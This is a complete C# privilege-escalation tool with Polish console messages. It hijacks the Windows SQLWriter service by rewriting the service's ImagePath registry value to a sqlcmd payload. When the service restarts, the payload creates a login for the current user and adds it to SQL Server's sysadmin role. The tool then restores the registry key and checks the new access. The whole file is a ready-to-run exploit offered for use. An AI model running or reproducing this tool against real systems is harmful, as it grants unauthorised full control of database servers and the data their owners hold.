using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.ServiceProcess;
using Microsoft.Win32;
using System.Threading;

namespace EscalateSQLWriter
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("EscalateSQLWriter - C# Version");
            Console.WriteLine("=================================");

            if (!IsAdministrator())
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Skrypt wymaga uprawnień Administratora. Uruchom ponownie jako Administrator.");
                Console.ResetColor();
                return;
            }

            try
            {
                RunExploit();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Wystąpił nieoczekiwany błąd: {ex.Message}");
                Console.ResetColor();
            }

            Console.WriteLine("\nNaciśnij dowolny klawisz, aby zakończyć...");
            Console.ReadKey();
        }

        static void RunExploit()
        {
            // --- 1. Sprawdzenie lokalizacji SQL Writer ---
            string sqlWriterRegPath = @"SYSTEM\CurrentControlSet\Services\SQLWriter";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[1] Sprawdzanie lokalizacji SQL Writer w rejestrze...");
            Console.ResetColor();

            string originalImagePath = null;
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sqlWriterRegPath))
            {
                if (key == null)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Nie znaleziono klucza rejestru dla usługi SQL Writer.");
                    return;
                }
                originalImagePath = key.GetValue("ImagePath") as string;
            }

            if (string.IsNullOrEmpty(originalImagePath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Nie można odczytać ImagePath usługi SQL Writer.");
                return;
            }
            Console.WriteLine($"    Obecna ścieżka: {originalImagePath}");

            // --- 2. Backup klucza rejestru ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[2] Wykonywanie backupu klucza rejestru...");
            Console.ResetColor();
            string backupFile = Path.Combine(Directory.GetCurrentDirectory(), "SQLWriter_Backup.reg");

            // Użycie reg.exe export
            ProcessStartInfo regExport = new ProcessStartInfo("reg.exe", $"export \"HKLM\\{sqlWriterRegPath}\" \"{backupFile}\" /y");
            regExport.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(regExport)?.WaitForExit();

            if (File.Exists(backupFile))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"    Backup zapisano w: {backupFile}");
                Console.ResetColor();
            }
            else
            {
                throw new Exception("Plik backupu nie został utworzony.");
            }

            // --- 3. Lokalizacja sqlcmd.exe ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[3] Szukanie sqlcmd.exe...");
            Console.ResetColor();
            string sqlcmdPath = FindSqlCmd();

            if (string.IsNullOrEmpty(sqlcmdPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Nie znaleziono sqlcmd.exe.");
                return;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"    Znaleziono: {sqlcmdPath}");
            Console.ResetColor();

            // --- 4. Wybór usługi SQL Server ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[4] Skanowanie usług SQL Server...");
            Console.ResetColor();

            var sqlServices = ServiceController.GetServices()
                .Where(s => (s.ServiceName == "MSSQLSERVER" || s.ServiceName.StartsWith("MSSQL$")) && s.Status == ServiceControllerStatus.Running)
                .ToList();

            if (sqlServices.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Nie znaleziono żadnych uruchomionych usług SQL Server.");
                return;
            }

            ServiceController selectedService = null;
            if (sqlServices.Count == 1)
            {
                selectedService = sqlServices[0];
                Console.WriteLine($"    Znaleziono jedną aktywną usługę: {selectedService.ServiceName}");
            }
            else
            {
                Console.WriteLine("    Znaleziono wiele usług. Wybierz jedną:");
                for (int i = 0; i < sqlServices.Count; i++)
                {
                    Console.WriteLine($"    [{i}] {sqlServices[i].ServiceName} ({sqlServices[i].DisplayName})");
                }

                while (selectedService == null)
                {
                    Console.Write($"    Wpisz numer usługi (0..{sqlServices.Count - 1}): ");
                    string input = Console.ReadLine();
                    if (int.TryParse(input, out int index) && index >= 0 && index < sqlServices.Count)
                    {
                        selectedService = sqlServices[index];
                    }
                    else
                    {
                        Console.WriteLine("    Nieprawidłowy wybór.");
                    }
                }
            }

            string serverName = ".";
            if (selectedService.ServiceName != "MSSQLSERVER")
            {
                string instanceName = selectedService.ServiceName.Substring(6); // Remove MSSQL$
                serverName = $".\\{instanceName}";
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"    Wybrano cel: {serverName}");
            Console.ResetColor();

            // --- 5. Ustalenie użytkownika i domeny ---
            string currentUser = WindowsIdentity.GetCurrent().Name;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"[5] Użytkownik docelowy: {currentUser}");
            Console.ResetColor();

            // --- 6. Zmiana rejestru (Payload) ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[6] Przygotowanie payloadu i modyfikacja rejestru...");
            Console.ResetColor();

            string sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";

            // Escape double quotes for the command line argument
            string escapedQuery = sqlQuery.Replace("\"", "\"\"");
            string payload = $"\"{sqlcmdPath}\" -S {serverName} -Q \"{escapedQuery}\"";

            Console.WriteLine("    Nadpisywanie klucza ImagePath...");
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sqlWriterRegPath, true))
            {
                key.SetValue("ImagePath", payload, RegistryValueKind.ExpandString); // or String
            }

            // Verify
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sqlWriterRegPath))
            {
                string currentVal = key.GetValue("ImagePath") as string;
                if (currentVal == payload)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("    Rejestr zmodyfikowany pomyślnie.");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Nie udało się zmodyfikować rejestru.");
                    return;
                }
            }

            // --- 7. Restart usługi SQL Writer ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[7] Zatrzymywanie i uruchamianie usługi SQL Writer...");
            Console.ResetColor();

            ServiceController sc = new ServiceController("SQLWriter");
            if (sc.Status != ServiceControllerStatus.Stopped)
            {
                try
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"    Ostrzeżenie przy zatrzymywaniu: {e.Message}");
                }
            }

            Console.WriteLine("    Uruchamianie usługi (błąd jest oczekiwany)...");
            try
            {
                sc.Start();
                sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("    Usługa zgłosiła błąd przy starcie (zgodnie z planem: sqlcmd zakończył działanie).");
                Console.ResetColor();
            }

            // --- 8. Przywracanie rejestru ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[8] Przywracanie oryginalnego wpisu w rejestrze...");
            Console.ResetColor();

            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", originalImagePath, RegistryValueKind.ExpandString);
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("    Przywrócono oryginalną wartość ImagePath.");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"KRYTYCZNE: Nie udało się przywrócić rejestru! Użyj pliku .reg do naprawy: {backupFile}");
                Console.WriteLine($"Błąd: {ex.Message}");
                Console.ResetColor();
            }

            // --- 9. Restart normalny ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[9] Ponowne uruchamianie SQL Writer w trybie normalnym...");
            Console.ResetColor();

            try
            {
                sc.Refresh();
                // Ensure stopped first (sometimes it might be in pending state)
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                     // Force kill if necessary? simpler to just try stop
                     try { sc.Stop(); sc.WaitForStatus(ServiceControllerStatus.Stopped); } catch {}
                }

                sc.Start();
                sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("    Usługa SQL Writer działa poprawnie.");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine($"    Nie udało się uruchomić usługi SQL Writer: {ex.Message}");
                 Console.ResetColor();
            }

            // --- 10. Test dostępu ---
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[10] Test dostępu do bazy Master...");
            Console.ResetColor();

            string testQuery = "SELECT 'SUKCES: Użytkownik ' + SYSTEM_USER + ' ma dostęp do serwera ' + @@SERVERNAME";
            ProcessStartInfo testInfo = new ProcessStartInfo(sqlcmdPath, $"-S {serverName} -E -Q \"{testQuery}\"");
            testInfo.UseShellExecute = false;
            testInfo.RedirectStandardOutput = true;
            testInfo.RedirectStandardError = true;

            var process = Process.Start(testInfo);
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            if (process.ExitCode == 0)
            {
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("    Weryfikacja zakończona powodzeniem.");
                 Console.WriteLine("    Output: " + output.Trim());
                 Console.ResetColor();
            }
            else
            {
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine($"    sqlcmd zwrócił kod błędu: {process.ExitCode}");
                 Console.WriteLine($"    Error: {error}");
                 Console.ResetColor();
            }

            Console.WriteLine("Gotowe.");
        }

        static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string FindSqlCmd()
        {
            // Check PATH
            var pathEnv = Environment.GetEnvironmentVariable("PATH");
            if (pathEnv != null)
            {
                var paths = pathEnv.Split(';');
                foreach (var path in paths)
                {
                    string fullPath = Path.Combine(path, "sqlcmd.exe");
                    if (File.Exists(fullPath)) return fullPath;
                }
            }

            // Common locations
            string[] searchPaths = {
                @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC",
                @"C:\Program Files\Microsoft SQL Server", // Generic search base
            };

            foreach (var basePath in searchPaths)
            {
                if (Directory.Exists(basePath))
                {
                    try
                    {
                        var files = Directory.GetFiles(basePath, "sqlcmd.exe", SearchOption.AllDirectories);
                        if (files.Length > 0) return files[0];
                    }
                    catch { }
                }
            }

            return null;
        }
    }
}
